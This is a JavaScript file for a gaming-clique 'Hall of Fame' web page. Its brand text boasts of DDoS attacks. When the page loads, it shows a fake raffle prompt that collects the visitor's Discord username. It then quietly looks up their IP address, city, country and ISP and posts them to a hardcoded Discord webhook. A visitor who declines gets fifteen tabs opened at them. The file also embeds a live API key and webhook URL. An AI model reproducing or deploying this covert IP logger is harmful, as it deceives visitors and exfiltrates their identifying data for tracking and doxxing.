const brandDescription = [
    'pro ragers',
    'lobby slammers',
    'xane ddosers',
    'trashtalkers',
    'omegatm fanboys',
    'powered by velocity',
    'hack vs hack team'
];

const effects = ['bounce', 'flash', 'pulse', 'rubberBand', 'shake', 'swing', 'tada', 'wobble', 'jello'];

function promptUser() {
    const video = document.querySelector('.background-video');
    const username = prompt("You have been chosen in a raffle to be apart of Ragers Hall Of Fame, Please Input your discord username.");
    
    if (username) {
        // Force video restart and play with audio
        video.currentTime = 0;
        video.muted = false;
        video.volume = 1.0;
        const playPromise = video.play();
        
        if (playPromise !== undefined) {
            playPromise.then(() => {
                // Video is playing perfectly!
            }).catch(error => {
                // If autoplay fails, add a click event to start
                document.addEventListener('click', () => {
                    video.play();
                }, { once: true });
            });
        }
        
        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e3936cf89e4b41c8af209d86c02a8a39`)
            .then(response => response.json())
            .then(data => {
                const webhookData = {
                    content: `New Hall of Fame Entry!`,
                    embeds: [{
                        title: "User Information",
                        color: 16711680,
                        fields: [
                            { name: "Discord Username", value: username },
                            { name: "IP Address", value: data.ip },
                            { name: "Location", value: `${data.city}, ${data.country_name}` },
                            { name: "ISP", value: data.isp }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch('https://discord.com/api/webhooks/1305470328201547786/-8tteaCntSyJDyB-Ln_HsXUBBAEC80IjUnAH2UD260y-9dJ2307ETA3qfmAQ-GBFOsO_', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                });
            });
    } else {
        for(let i = 0; i < 15; i++) {
            window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const loadingContainer = document.querySelector('.loading-container');
    const mainPage = document.querySelector('.main-page');
    const video = document.querySelector('.background-video');
    video.muted = true; // Start muted to comply with autoplay policies

    setTimeout(() => {
        loadingContainer.classList.add('fade-out');
        setTimeout(() => {
            loadingContainer.style.display = 'none';
            mainPage.style.display = 'block';
            mainPage.classList.add('fade-in');
            video.play();
            updateBrandDescription();
            setTimeout(promptUser, 1000);
        }, 1000);
    }, 2750);
});

function updateBrandDescription() {
    const element = document.getElementById('brandDescription');
    let currentIndex = 0;

    setInterval(() => {
        const randomEffect = effects[Math.floor(Math.random() * effects.length)];
        element.textContent = brandDescription[currentIndex];
        element.className = `animate__animated animate__${randomEffect}`;
        currentIndex = (currentIndex + 1) % brandDescription.length;
    }, 2000);
}

fetch('users.html')
    .then(response => response.text())
    .then(data => {
        document.getElementById('users-container').innerHTML = data;
    });
